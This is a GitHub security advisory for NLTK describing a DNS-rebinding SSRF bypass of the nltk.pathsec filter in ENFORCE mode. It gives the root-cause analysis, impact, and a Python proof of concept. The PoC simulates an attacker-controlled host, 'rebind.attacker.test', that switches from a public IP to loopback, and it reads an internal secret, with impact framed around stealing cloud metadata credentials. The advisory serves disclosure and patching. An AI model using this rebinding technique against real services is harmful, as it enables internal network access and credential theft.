# [H] Natural Language Toolkit (NLTK): DNS-rebinding SSRF filter bypass in nltk.pathsec.urlopen (nltk.download / nltk.data.load) defeats ENFORCE mode

## Summary
Severity: High
Advisory: GHSA-qvv7-cg9c-w4x3
CVE: CVE-2026-12075
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-31
Source: https://github.com/advisories/GHSA-qvv7-cg9c-w4x3
Type: github-advisory

## Affected
- PyPI: `nltk` — affected >=0 <3.10.0

## Details
### Summary
`nltk.pathsec` provides an SSRF filter that NLTK documents as a security control, blocking loopback, private, link-local, and multicast ranges (including obfuscated forms) and recommending strict `ENFORCE` mode for security-sensitive environments. The filter is bypassable by DNS rebinding: `validate_network_url()` resolves the hostname and checks the resulting IP, but the actual HTTP connection re-resolves the hostname independently at connect time and connects to that second result. The validated IP is never the one connected to. An attacker controlling DNS for a hostname (a TTL-0 rebinding record) returns a public IP for the validation lookup and an internal/loopback IP for the connection lookup, defeating the filter even under `nltk.pathsec.ENFORCE = True`.


### Details
`urlopen()` validates, then hands the raw hostname to `urllib`, which performs a second name resolution deep in the connection layer (`http.client.HTTPConnection.connect` → `socket.create_connection` → `socket.getaddrinfo`). The validation-side and connection-side resolutions are fully independent code paths with independent caches:

1. `validate_network_url()` calls `_resolve_hostname(parsed.hostname)` and checks each returned IP against loopback/link-local/multicast/private, blocking under `ENFORCE`. (Resolution #1.)
2. `urlopen()` then calls `build_opener(...).open(url)` with the original URL (raw hostname), so `urllib` resolves the hostname again at connect time. (Resolution #2 — the address actually connected to.)

`_resolve_hostname` is decorated with `lru_cache` and its docstring claims to mitigate DNS rebinding, but the cache only memoizes the validation-side lookup. The connection layer's `getaddrinfo` does not consult that cache, so it provides no protection. The annotation is a false assurance: an operator reading it may believe rebinding is handled when it is not.


### PoC
```python
import socket
import threading
import warnings
from collections import defaultdict
from http.server import BaseHTTPRequestHandler, HTTPServer

warnings.filterwarnings("ignore")

import nltk
import nltk.pathsec as ps

ps.ENFORCE = True  # the documented strict SSRF sandbox

ATTACKER_HOST = "rebind.attacker.test"   # attacker-controlled authoritative DNS
PUBLIC_IP = "93.184.216.34"              # public address served for the validation lookup
SECRET = b"TOP-SECRET-LOOPBACK-ONLY-METADATA-CREDENTIALS"


# --- A loopback-only "internal service" (stands in for 169.254.169.254 / admin UI) ---
class _Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(SECRET)))
        self.end_headers()
        self.wfile.write(SECRET)

    def log_message(self, *a):
        pass


def start_internal_server():
    srv = HTTPServer(("127.0.0.1", 0), _Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv.server_address[1]  # ephemeral port


# --- Model the TTL-0 rebinding record at the resolver layer ---
_real_getaddrinfo = socket.getaddrinfo
_lookups = defaultdict(int)


def _rebinding_getaddrinfo(host, port, *args, **kwargs):
    if host == ATTACKER_HOST:
        n = _lookups[host]
        _lookups[host] += 1
        ip = PUBLIC_IP if n == 0 else "127.0.0.1"   # 1st=public (validate), then loopback (connect)
        p = port if isinstance(port, int) else 0
        kind = "VALIDATION -> public" if n == 0 else "CONNECT    -> loopback"
        print(f"    [dns] getaddrinfo({host!r}) lookup #{n}: {kind} ({ip})")
        return [(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, "", (ip, p))]
    return _real_getaddrinfo(host, port, *args, **kwargs)


def fetch(url):
    with ps.urlopen(url, timeout=5) as r:
        return r.read()


def main():
    print("=" * 62)
    print(f" NLTK pathsec DNS-rebinding SSRF bypass PoC")
    print(f" nltk {nltk.__version__}   |   nltk.pathsec.ENFORCE = {ps.ENFORCE}")
    print("=" * 62)

    port = start_internal_server()
    print(f"[*] internal loopback service: http://127.0.0.1:{port}/  (returns secret)\n")

    socket.getaddrinfo = _rebinding_getaddrinfo
    ps._resolve_hostname.cache_clear()  # fresh validation cache, as on a real process
    try:
        # ---- Control: a DIRECT loopback URL must be blocked by the filter ----
        print("[1] CONTROL: direct loopback URL (filter must block this)")
        direct = f"http://127.0.0.1:{port}/"
        try:
            fetch(direct)
            print(f"    [?] unexpected: {direct} was NOT blocked\n")
            control_ok = False
        except PermissionError as e:
            print(f"    [OK] blocked -> PermissionError: {e}\n")
            control_ok = True

        # ---- Attack: rebinding hostname bypasses the same filter ----
        print("[2] ATTACK: rebinding hostname (public at validate, loopback at connect)")
        evil = f"http://{ATTACKER_HOST}:{port}/"
        print(f"    fetching {evil}")
        try:
            body = fetch(evil)
            leaked = SECRET in body
            print(f"    body returned to caller: {body!r}")
            if leaked:
                print("\n  [VULN] loopback-only secret exfiltrated through pathsec.urlopen")
                print(f"         validated IP = {PUBLIC_IP} (public)  but  connected IP = 127.0.0.1")
                print(f"         non-blind SSRF despite ENFORCE = {ps.ENFORCE}")
                verdict = "VULNERABLE"
            else:
                print("\n  [?] fetch succeeded but secret marker not present")
                verdict = "INCONCLUSIVE"
        except PermissionError as e:
            # Patched build: validate against the connect-time IP (or pin/resolve-once).
            print(f"\n  [SAFE] blocked -> PermissionError: {e}")
            verdict = "NOT VULNERABLE"
    finally:
        socket.getaddrinfo = _real_getaddrinfo

    print("\n" + "=" * 62)
    print(f" Control (direct loopback blocked): {control_ok}")
    print(f" Result: {verdict}   (ENFORCE = {ps.ENFORCE})")
    print("=" * 62)


if __name__ == "__main__":
    main()
```

### Impact
- **Full-response (non-blind) SSRF.** Because the fetched body is returned to the caller (e.g. `nltk.data.load` with `format="raw"`), an attacker can read responses from internal-only HTTP services, loopback admin interfaces, and — most seriously — the cloud instance metadata service, which on major cloud providers can expose IAM/service credentials and lead to cloud account compromise.
- **Bypass of an explicit security control.** It defeats the `nltk.pathsec` SSRF filter, including the `ENFORCE` mode that NLTK's documentation recommends precisely for environments where untrusted input may reach NLTK. Deployments that adopted that boundary are not actually protected, and the `lru_cache` annotation claiming to mitigate rebinding makes the false assurance worse.

## References
- https://github.com/nltk/nltk/security/advisories/GHSA-qvv7-cg9c-w4x3
- https://github.com/nltk/nltk
